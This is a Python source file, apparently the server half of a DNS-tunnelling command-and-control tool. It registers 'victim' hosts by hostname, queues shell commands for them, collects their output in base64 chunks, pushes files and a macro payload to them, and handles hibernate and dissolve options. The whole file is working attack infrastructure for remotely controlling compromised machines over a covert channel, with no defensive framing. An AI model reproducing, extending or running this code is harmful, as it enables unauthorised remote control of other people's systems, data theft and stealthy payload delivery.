# command.py
import json
import time
import base64
from os import path
import hashlib

import settings

# parse command from dns request.  For consistency, each value will be counted from the right
# [..., value 3, value 2, value 1]
def parsecommand(cmddata):
    decodedcmd = bytes.fromhex(cmddata[-1]).decode('utf-8')         # decode value 1, c2 option

    options = {
        "int": optInit,
        "end": optEnd,
        "fil": optFile,
        "cnk": optChunk,
        "cmd": optCommand,
        "dis": optDissolve,
        "hib": optHibernate,
        "hsh": optHash,
        "mac": optMacro
    }

    return options[decodedcmd](cmddata)

# initial connection by client, set up record in manage.json and return ID to client
def optInit(cmddata):
    decodedHostname = bytes.fromhex(cmddata[-3]).decode('utf-8')         # decode value 3, victim hostname

    print("\n\n!New Connection!\n")

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        idTracker = manage["id"]
        found = False
        
        for record in manage["clients"]:                    # check to see if this host already has an ID
            if manage["id"] == int(record):
                manage["id"] += 1
            if decodedHostname == manage["clients"][record]["hostname"]:
                found = True
                idTracker = record

        if not found:                                       # if this host doesn't have an ID, assign one and save record to manage.json
            manage["clients"][str(idTracker)] = settings.unknownEntry
            manage["clients"][str(idTracker)]["hostname"] = decodedHostname
            manage["clients"][str(idTracker)]["lastactive"] = time.time()
            manage["id"] += 1

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
    
    print("ID: " + str(idTracker) + "\tHostname: " + decodedHostname)
    print("\n" + str(manage["currID"]) + " > ", end = '')

    return base64.b64encode(str(idTracker).encode())

def optCommand(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID

    manage = {}
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        if clientID not in manage["clients"]:           # if client is running and for some reason is not stored in manage.json, add it
            manage["clients"][clientID] = settings.unknownEntry
            print("\n\n!New Connection!\n")
            print("ID: " + clientID + "\tHostname: " + manage["clients"][clientID]["hostname"])
            print("\n" + str(manage["currID"]) + " > ", end = '')

        command = manage["clients"][clientID]["command"]

        if command != "":
            manage["clients"][clientID]["response"] = ""
        
        manage["clients"][clientID]["command"] = ""
        manage["clients"][clientID]["lastactive"] = time.time()

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    if command:
        return base64.b64encode(command.encode())
    return base64.b64encode("wait".encode())

def optChunk(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    chunk = bytes.fromhex(cmddata[-3]).decode('utf-8')  # decode value 3, response chunk

    manage = {}
    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        manage["clients"][clientID]["response"] += chunk

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    return base64.b64encode("ready".encode())

def optEnd(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    with open('./manage.json') as f:
        manage = json.load(f)

    print("\n\n" + manage["clients"][clientID]["response"])
    print("\n" + str(manage["currID"]) + " > ", end = '')

    return base64.b64encode("ok".encode())

def optDissolve(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        del manage["clients"][clientID]
        manage["currID"] = ""

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
        
    return base64.b64encode("done".encode())

def optHibernate(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    arg1 = bytes.fromhex(cmddata[-3]).decode('utf-8')   # decode value 3, argument

    with open('./manage.json') as f:
            manage = json.load(f)

    if arg1 == "time":
        return base64.b64encode(manage["clients"][clientID]["arg"].encode())

def optFile(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID
    index = bytes.fromhex(cmddata[-3]).decode('utf-8')  # decode value 3, file index posistion

    with open('./manage.json') as f:
        manage = json.load(f)

    if (index == "name"):
        return base64.b64encode(manage["clients"][clientID]["file"]["name"].encode())
    if (index == "size"):
        return base64.b64encode(str(len(manage["clients"][clientID]["file"]["data"])).encode())
    if (int(index) >= len(manage["clients"][clientID]["file"]["data"])):
        return base64.b64encode("done".encode())
    return manage["clients"][clientID]["file"]["data"][int(index):int(index) + 0xfc].encode()

def optHash(cmddata):
    clientID = cmddata[-2]                                  # grab value 2, client ID
    filehash = cmddata[-3]                                  # grab value 3, hash of file

    with open('./manage.json') as f:
        manage = json.load(f)
    
    hash_object = hashlib.md5(base64.b64decode(manage["clients"][clientID]["file"]["data"]))

    if filehash == hash_object.hexdigest():
        return base64.b64encode("done".encode())
    return base64.b64encode("bad".encode())

def optMacro(cmddata):
    index = cmddata[-2]                                  # grab value 2, index
    with open('./manage.json') as f:
        manage = json.load(f)
    
    if (index == "s"):
        return str(len(manage["macro"])).encode()

    return manage["macro"][int(index):int(index) + 0xfc].encode()